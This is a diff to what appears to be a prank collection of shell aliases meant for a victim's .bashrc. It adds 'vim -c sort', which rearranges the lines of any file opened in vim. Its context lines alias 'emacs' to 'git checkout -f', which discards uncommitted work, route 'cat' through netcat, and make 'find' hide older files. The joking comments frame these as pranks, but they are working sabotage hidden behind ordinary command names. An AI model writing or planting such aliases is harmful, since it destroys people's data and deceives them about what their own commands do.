@@ -31,5 +31,8 @@ alias cat="nc -w1 localhost 54321 | nc -l localhost 54321 2>/dev/null | cat"
 # Serves you right for wanting to use emacs.
 alias emacs="git checkout -f"
 
+# Vim has everything in order.
+alias vim="vim -c sort"
+
 # History class is boring.
 alias find="find -newer ~/.bashrc"
